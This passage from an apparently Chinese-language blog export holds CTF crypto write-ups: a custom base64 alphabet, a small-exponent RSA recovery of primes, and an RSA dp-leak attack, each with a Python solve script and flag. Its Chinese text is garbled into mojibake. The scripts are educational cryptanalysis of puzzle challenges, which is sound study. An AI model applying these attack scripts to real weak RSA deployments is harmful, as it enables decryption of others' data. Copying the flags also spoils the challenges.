<p>é™¤äº†ä»¥ä¸Šä¹‹å¤– ä¹Ÿæœ‰å¤šå¤„æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè¿™é‡Œä¾¿ä¸å†åˆ—ä¸¾ã€‚ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>NSS Crypto-03</title>
    <url>/posts/555436f5/</url>
    <content><![CDATA[<h3 id="è¿™æ˜¯base"><a href="#è¿™æ˜¯base" class="headerlink" title="è¿™æ˜¯base??"></a>è¿™æ˜¯base??</h3><p>é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯pythonå­—å…¸ ç„¶åæŠŠè¿™ä¸ªè¿›è¡Œæ›¿æ¢ è®©aiå»è§£å¯† ä½†æ˜¯ä¸è¡Œ</p>
<p>ç„¶åæå–å‡º å­—å…¸æ‰€æœ‰å€¼ï¼Œæ”¾åˆ°CyberChefä¸­ base64æ›¿æ¢ è§£å¯†å³å¯  BJD{D0_Y0u_kNoW_Th1s_b4se_map}</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">base64_dict = &#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_values_str = <span class="string">&#x27;&#x27;</span>.join(base64_dict.values())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_values_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/1.png"></p>
<h3 id="NSSCTF-2022-Spring-Recruit-rrrsssaaa"><a href="#NSSCTF-2022-Spring-Recruit-rrrsssaaa" class="headerlink" title="[NSSCTF 2022 Spring Recruit]rrrsssaaa"></a>[NSSCTF 2022 Spring Recruit]rrrsssaaa</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(p, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(q, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(r, <span class="number">3</span>, n)))</span><br><span class="line"><span class="comment"># n = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761441087845248621463389786351743200696279604003824362262237505386409700329605140703782099240992158439201646344692107831931849079888757310523663310273856448713786678014221779214444879454790399990056124051739535141631564534546955444505648933134838799753362350266884682987713823886338789502396879543498267617432600351655901149380496067582237899323865338094444822339890783781705936546257971766978222763417870606459677496796373799679580683317833001077683871698246143179166277232084089913202832193540581401453311842960318036078745448783370048914350299341586452159634173821890439194014264891549345881324015485910286021846721593668473</span></span><br><span class="line"><span class="comment"># c = 11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line"><span class="comment"># p3 = 891438237083490546089708018947678893226384856270496377765399277417697191150845296075484241536063149330788867177806265725641352439792185047059884077696267280233195764685547392586251429555216372682368991273055524268769223153988946085858123028200360359212117360701384933036871231911448311911374115683475228820531478240539549424647154342506853356292956506486091063660095505979187297020928573605860329881982122478494944846700224611808246427660214535971723459345029873385956677292979041143593821672034573140001092625650099257402018634684516092489263998517027205660003413512870074652126328536906790020794659204007921147300771594986038917179253827432120018857213350120695302091483756021206199805521083496979628811676116525321724267588515105188480380865374667274442027086789352802613365511142499668793725505110436809024171752137883546327359935102833441492430652019931999144063825010678766130335038975376834579129516127516820037383067</span></span><br><span class="line"><span class="comment"># q3 = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761440671033435053531971051698504592848580356684103015611323747688216493729331061402058160819388999663041629882482138465124920580049057123360829897432472221079140360215664537272316836767039948368780837985855835419681893347839311156887660438769948501100287062738217966360434291369179859862550767272985972263442512061098317471708987686120577904202391381040801620069987103931326500146536990700234262413595295698193570184681785854277656410199477649697026112650581343325348837547631237627207304757407395388155701341044939408589591213693329516396531103489233367665983149963665364824119870832353269655933102900004362236232825539480774</span></span><br><span class="line"><span class="comment"># r3 = 22285955927087263652242700473691972330659621406762409444134981935442429778771132401887106038401578733269721679445156643141033810994804626176497101942406682005829894117138684814656285738880409317059224781826388106719230578849723652146453075705009008980302934017534623325921780797786207797784352892086880720749202442492937918619992591614713131681306874944356693778359565004415437554407990089293135634916859631279984463829118336826115430997439527110961309956466956650522900331263720500751112297418506140413317489683875995326726992533904683800042127871963320754241310699432792081707870167598822650064976439270556418985242630368723264289700246406905189810458354474959276748887369363592834205660349184660073395182450526542246354364903399132116153732074081050985584216815493617906868615192465631416955706457835185743023758573279838341229835613609332206338401219168119635681832981552328638132500079074010106995297184587143613134093145</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>p = getPrime(1024)</p>
<p> r = p * 5 + i    åˆ¤æ–­ræ˜¯å¦ä¸ºç´ æ•°ï¼Œå¦‚æœæ˜¯ç´ æ•° iæ¸…é›¶  å¦åˆ™j++ ç›´åˆ°rä¸ºç´ æ•°</p>
<p>q = p * 10 + i  qä¹ŸåŒç†r</p>
<p>n = p * q * r e = 65537 c = pow(bytes_to_long(flag.encode()), e, n)</p>
<p>æ±‚m </p>
<p>p3 q3 r3  å‡ä¸º  X ^3 mod n   ä¼˜å…ˆè€ƒè™‘ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</p>
<p>C ä¸‰ m^e mod n C = k*n + m^e  , kâˆˆZ </p>
<p>p3 = pow(p, 3, n) q3 = pow(q, 3, n) r3 = pow(r, 3, n)</p>
<p>c = pow(m,e,n)</p>
<p>ç„¶åä½åŠ å¯†æŒ‡æ•°æ±‚å‡ºå¯¹åº”çš„ p q r </p>
<p>n = q * p * r </p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªè„šæœ¬ å¸¦å…¥ q3 p3 r3 å¯ä»¥æ±‚å‡º p q    ï¼Œræ²¡æ±‚å‡ºæ¥ã€‚</p>
<p>ä½†æ˜¯çŸ¥é“ p q n ä¹Ÿå°±å¯ä»¥æ±‚å‡ºræ¥</p>
<p>r å¯æ ¹æ®åŸé¢˜ä¸­på»æ±‚å‡ºæ¥</p>
<p>æ±‚å‡ºåå°±æ­£å¸¸æ±‚phi d m å³å¯å¾—åˆ°flag</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761441087845248621463389786351743200696279604003824362262237505386409700329605140703782099240992158439201646344692107831931849079888757310523663310273856448713786678014221779214444879454790399990056124051739535141631564534546955444505648933134838799753362350266884682987713823886338789502396879543498267617432600351655901149380496067582237899323865338094444822339890783781705936546257971766978222763417870606459677496796373799679580683317833001077683871698246143179166277232084089913202832193540581401453311842960318036078745448783370048914350299341586452159634173821890439194014264891549345881324015485910286021846721593668473</span></span><br><span class="line">c = <span class="number">11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line">p3 = <span class="number">891438237083490546089708018947678893226384856270496377765399277417697191150845296075484241536063149330788867177806265725641352439792185047059884077696267280233195764685547392586251429555216372682368991273055524268769223153988946085858123028200360359212117360701384933036871231911448311911374115683475228820531478240539549424647154342506853356292956506486091063660095505979187297020928573605860329881982122478494944846700224611808246427660214535971723459345029873385956677292979041143593821672034573140001092625650099257402018634684516092489263998517027205660003413512870074652126328536906790020794659204007921147300771594986038917179253827432120018857213350120695302091483756021206199805521083496979628811676116525321724267588515105188480380865374667274442027086789352802613365511142499668793725505110436809024171752137883546327359935102833441492430652019931999144063825010678766130335038975376834579129516127516820037383067</span></span><br><span class="line">q3 = <span class="number">44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761440671033435053531971051698504592848580356684103015611323747688216493729331061402058160819388999663041629882482138465124920580049057123360829897432472221079140360215664537272316836767039948368780837985855835419681893347839311156887660438769948501100287062738217966360434291369179859862550767272985972263442512061098317471708987686120577904202391381040801620069987103931326500146536990700234262413595295698193570184681785854277656410199477649697026112650581343325348837547631237627207304757407395388155701341044939408589591213693329516396531103489233367665983149963665364824119870832353269655933102900004362236232825539480774</span></span><br><span class="line">r3 = <span class="number">22285955927087263652242700473691972330659621406762409444134981935442429778771132401887106038401578733269721679445156643141033810994804626176497101942406682005829894117138684814656285738880409317059224781826388106719230578849723652146453075705009008980302934017534623325921780797786207797784352892086880720749202442492937918619992591614713131681306874944356693778359565004415437554407990089293135634916859631279984463829118336826115430997439527110961309956466956650522900331263720500751112297418506140413317489683875995326726992533904683800042127871963320754241310699432792081707870167598822650064976439270556418985242630368723264289700246406905189810458354474959276748887369363592834205660349184660073395182450526542246354364903399132116153732074081050985584216815493617906868615192465631416955706457835185743023758573279838341229835613609332206338401219168119635681832981552328638132500079074010106995297184587143613134093145</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(p3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;p=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line">p= <span class="number">96241803526087516516438618680574139229212699224895199026126947479609515703069904259770933066463243844738712136916991719874179296797623802919752542053959297743706931240798992583332970879091497936378700193716012227086531507335444090574605921869576355704757589370608232721639204280020820678250787751406162350723</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(q3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;q=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line">q = <span class="number">962418035260875165164386186805741392292126992248951990261269474796095157030699042597709330664632438447387121369169917198741792967976238029197525420539592977437069312407989925833329708790914979363787001937160122270865315073354440905746059218695763557047575893706082327216392042800208206782507877514061623507521</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(r3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;r=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line"><span class="comment"># ræ±‚ä¸å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰åŸé¢˜ç»™å‡ºçš„på»æ±‚å‡ºr</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e2,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;cc10786a-cc59-a07d-5c9f-df1c55b18cd4&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-P-Leak"><a href="#LitCTF-2023-P-Leak" class="headerlink" title="[LitCTF 2023]P_Leak"></a>[LitCTF 2023]P_Leak</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">dp=d%(p-<span class="number">1</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dp=&quot;</span>,dp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="comment">#dp= 5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line"><span class="comment">#n= 50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line"><span class="comment">#c= 39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>å·²çŸ¥dp,n,c,eï¼Œ dpæ³„éœ²ç±»</p>
<blockquote>
<p>å·²çŸ¥ e n c dp å€’æ¨ï¼šæ±‚m -&gt; æ±‚d -&gt; æ±‚phi -&gt; p q  d = gmpy2.invert(e,phi_n) phi_n = (p-1)(q-1)</p>
<p>ç”± dp*e ä¸‰ e*d mod (p-1) -&gt; e*d = k(p-1)+dp*eï¼Œ kâˆˆZ  ç”± e*d ä¸‰ 1 mod (p-1)(q-1) -&gt; e*d = Î©(p-1)(q-1)+1 ï¼ŒÎ©âˆˆZ æ ¹æ®ä¸¤ä¸ªe*\d çš„ç­‰å¼ -ã€‹ k(p-1)+dp*e =  Î©(p-1)(q-1)+1 ï¼Œ kâˆˆZï¼ŒÎ©âˆˆZ è¿›è€Œå¾—åˆ°  dp * e = (p-1)* (Î©(q-1)-k ) + 1  ä¹Ÿå°±è¯´ dp*e = Î²(p-1) + 1    ï¼ŒÎ²âˆˆZ âˆµ dp &lt; (p-1) âˆ´ e&gt;Î²  å³  1&lt;Î²&lt;e æ‰€ä»¥å­˜åœ¨ä¸€ä¸ªÎ²  æ»¡è¶³  dp*e = Î²(p-1) + 1  æ‰€ä»¥éå†Î² æ‰¾åˆ°åå¯æ±‚å‡º p-1 è¿›è€Œæ±‚å‡º p q</p>
</blockquote>
<p>å¯ä»¥ç›´æ¥å¥—æ¨¡æ¿</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp= <span class="number">5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line">n= <span class="number">50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line">c= <span class="number">39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># åœ¨èŒƒå›´(1,e)ä¹‹é—´è¿›è¡Œéå†</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># å­˜åœ¨pï¼Œä½¿å¾—nèƒ½è¢«pæ•´é™¤</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># æ¬§æ‹‰å®šç†</span></span><br><span class="line">            d = gmpy2.invert(e, phi)  <span class="comment"># æ±‚æ¨¡é€†</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># å¿«é€Ÿæ±‚å¹‚å–æ¨¡è¿ç®—</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;Prim3_1s_Le@k!!!!!&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

